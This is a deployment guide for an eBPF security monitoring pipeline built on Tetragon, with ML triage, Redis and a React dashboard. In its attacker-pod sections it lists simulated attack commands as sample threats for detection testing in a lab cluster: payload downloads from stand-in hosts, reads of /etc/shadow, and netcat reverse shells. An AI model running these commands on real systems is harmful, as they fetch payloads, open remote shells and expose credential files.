# Sentinel-Core: Complete Linux Deployment Guide

End-to-end guide to run the full eBPF security pipeline — from Kubernetes cluster creation to a live dashboard with real threat data.

---

## Architecture Overview

```
┌─── Linux Host ──────────────────────────────────────────────────────┐
│                                                                     │
│  ┌─── Kind Cluster ─────────────────────────────────────┐           │
│  │                                                       │           │
│  │  ┌── Tetragon DaemonSet ──┐  ┌── attacker-pod ─────┐ │           │
│  │  │  eBPF probes:          │  │  curl, nc, cat...    │ │           │
│  │  │  • process_exec        │  │  (generates threats) │ │           │
│  │  │  • kprobe: sys_connect │  └──────────────────────┘ │           │
│  │  │  + TracingPolicies     │                           │           │
│  │  └────────┬───────────────┘                           │           │
│  └───────────┼───────────────────────────────────────────┘           │
│              │ kubectl logs (JSON stream)                            │
│              ▼                                                       │
│  ┌── Event Forwarder (Python) ──────────────────────────┐           │
│  │  Transform → ML Triage (XGBoost) → Publish           │           │
│  │  Port 8081: /metrics, /health, /sentinel/analyze     │           │
│  └──────────┬───────────────────────────────────────────┘           │
│             │ XADD sentinel:events                                   │
│             ▼                                                        │
│  ┌── Redis ──────────────────────────────────────────────┐          │
│  │  Stream: sentinel:events (last 10,000 events)         │          │
│  └──────────┬────────────────────────────────────────────┘          │
│             │ XREAD / XREVRANGE                                      │
│             ▼                                                        │
│  ┌── Dashboard API (dashboard_api.py) ───────────────────┐          │
│  │  Port 8080: /api/* endpoints + WebSocket               │          │
│  │  Reads Redis stream → enriches → serves to frontend    │          │
│  └──────────┬────────────────────────────────────────────┘          │
│             │ HTTP proxy + WebSocket                                  │
│             ▼                                                        │
│  ┌── React Dashboard (Vite) ────────────────────────────┐           │
│  │  Port 5173: Command Center, Incident Ledger,          │           │
│  │  Forensics Panel (MITRE, SHAP, YAML remediation)     │           │
│  └──────────────────────────────────────────────────────┘           │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Prerequisites

| Tool | Purpose | Install |
|---|---|---|
| **Docker** | Container runtime for Kind | [docs.docker.com/install](https://docs.docker.com/engine/install/) |
| **Python 3.11+** | Backend pipeline | `sudo apt install python3 python3-pip python3-venv` |
| **Node.js 18+** | Dashboard frontend | `curl -fsSL https://deb.nodesource.com/setup_18.x \| sudo -E bash - && sudo apt install nodejs` |
| **Redis** | Event stream | `sudo apt install redis-server && sudo systemctl start redis` |

`kind`, `kubectl`, and `helm` are **auto-downloaded** by `start_app.sh` if missing.

---

## Step-by-Step Deployment

### Step 1: Clone & Setup Python Environment

```bash
git clone https://github.com/revanth-gk/Aegis.git
cd Aegis/cspm-ebpf

# Create virtual environment
python3 -m venv .venv
source .venv/bin/activate

# Install Python dependencies
pip install -r requirements.txt
```

### Step 2: Configure Environment Variables

Create a `.env` file (optional — needed for RAG/LLM features):

```bash
cat > .env << 'EOF'
# Required for RAG pipeline (optional for basic demo)
GOOGLE_API_KEY=your-gemini-api-key
PINECONE_API_KEY=your-pinecone-key
PINECONE_INDEX_HOST=your-pinecone-host

# Redis (defaults work if Redis is on localhost)
REDIS_HOST=localhost
REDIS_PORT=6379
EOF
```

> **Note:** Without API keys, the pipeline still works — ML triage and MITRE mapping run locally. Only the RAG-powered incident reports require Gemini/Pinecone.

### Step 3: Start Redis

```bash
# Check if Redis is running
redis-cli ping
# Should output: PONG

# If not running:
sudo systemctl start redis
# or
redis-server --daemonize yes
```

### Step 4: Run the Full Pipeline (Automated)

The `start_app.sh` script handles everything automatically:

```bash
chmod +x start_app.sh
./start_app.sh
```

This script performs 6 steps:

| Step | What it does |
|---|---|
| **1/6** | Downloads `kind`, `kubectl`, `helm` if missing |
| **2/6** | Creates a Kind K8s cluster with kernel debug/trace mounts |
| **3/6** | Deploys Tetragon eBPF agent via Helm + applies TracingPolicies |
| **4/6** | Deploys an `attacker-pod` (Alpine with curl/nc) into the cluster |
| **5/6** | Executes real attack commands: payload download, `/etc/shadow` read, reverse shell, process enumeration, DNS exfiltration |
| **6/6** | Pipes Tetragon's event logs through the ML triage + forwarder pipeline, publishing to Redis |

At this point, **real eBPF events are flowing into Redis** on stream `sentinel:events`.

### Step 5: Start the Dashboard Backend

In a **new terminal**:

```bash
cd Aegis/cspm-ebpf
source .venv/bin/activate
python dashboard_api.py
```

You should see:
```
✅ Redis connected at localhost:6379
📊 Loaded N events from Redis into cache
============================================================
  SENTINEL-CORE DASHBOARD API — LIVE
  Port: 8080
  Redis: localhost:6379 (connected)
  Forwarder: http://localhost:8081
============================================================
```

### Step 6: Start the Dashboard Frontend

In a **third terminal**:

```bash
cd Aegis/cspm-ebpf/dashboard
npm install      # first time only
npm run dev
```

Open **http://localhost:5173** in your browser.

---

## Manual Step-by-Step (Without start_app.sh)

If you want to run each component individually:

### a) Create Kind Cluster

```bash
kind create cluster --name sentinel-cluster --config infra/kind-config.yaml

# Mount trace filesystems
docker exec sentinel-cluster-control-plane mount -t tracefs tracefs /sys/kernel/tracing
docker exec sentinel-cluster-control-plane mount -t debugfs debugfs /sys/kernel/debug
```

### b) Deploy Tetragon

```bash
helm repo add cilium https://helm.cilium.io
helm repo update
helm install tetragon cilium/tetragon -n kube-system -f tetragon-values.yaml --wait

# Wait for readiness
kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=tetragon -n kube-system --timeout=180s

# Apply TracingPolicies
kubectl apply -f sentinel-policy.yaml
kubectl apply -f policies/
```

### c) Deploy Attacker Pod & Generate Events

```bash
kubectl run attacker-pod --image=alpine/curl:latest --restart=Never -- sleep 3600
kubectl wait --for=condition=ready pod attacker-pod --timeout=60s

# Execute attacks
kubectl exec attacker-pod -- curl -sk http://evil.example.com/payload.sh -o /dev/null
kubectl exec attacker-pod -- cat /etc/shadow
kubectl exec attacker-pod -- sh -c "nc -w1 10.0.0.99 4444 </dev/null" &
kubectl exec attacker-pod -- ps aux
```

### d) Start the Forwarder Pipeline

```bash
# Stream Tetragon logs through the ML pipeline → Redis
kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon \
    -c export-stdout -f --since=1m | python3 -m forwarder.main
```

### e) Start Dashboard API + Frontend

```bash
# Terminal 2:
python dashboard_api.py

# Terminal 3:
cd dashboard && npm run dev
```

---

## Generating More Events

To produce additional threat telemetry at any time:

```bash
# Download external payload
kubectl exec attacker-pod -- curl -sk https://malicious.site/shell.sh -o /tmp/shell.sh

# Credential access
kubectl exec attacker-pod -- cat /etc/passwd

# Reverse shell attempt
kubectl exec attacker-pod -- sh -c "nc -e /bin/sh 10.0.0.99 4444" &

# Process enumeration
kubectl exec attacker-pod -- ps aux

# File system modification
kubectl exec attacker-pod -- chmod 777 /tmp

# Network scanning
kubectl exec attacker-pod -- wget -q https://example.com -O /dev/null
```

Each of these is captured by Tetragon, processed by the ML pipeline, and appears live on the dashboard.

---

## Ports Summary

| Service | Port | Description |
|---|---|---|
| Sentinel FastAPI | 8000 | Main analysis API (`main.py`) |
| Event Forwarder | 8081 | Forwarder metrics + `/sentinel/analyze` |
| **Dashboard API** | **8080** | Dashboard backend → Redis stream consumer |
| Dashboard UI | 5173 | React frontend (Vite dev server) |
| Redis | 6379 | Event stream (`sentinel:events`) |
| Tetragon gRPC | 54321 | eBPF telemetry endpoint |

---

## Cleanup

```bash
# Delete cluster
kind delete cluster --name sentinel-cluster

# Stop Redis
sudo systemctl stop redis
```
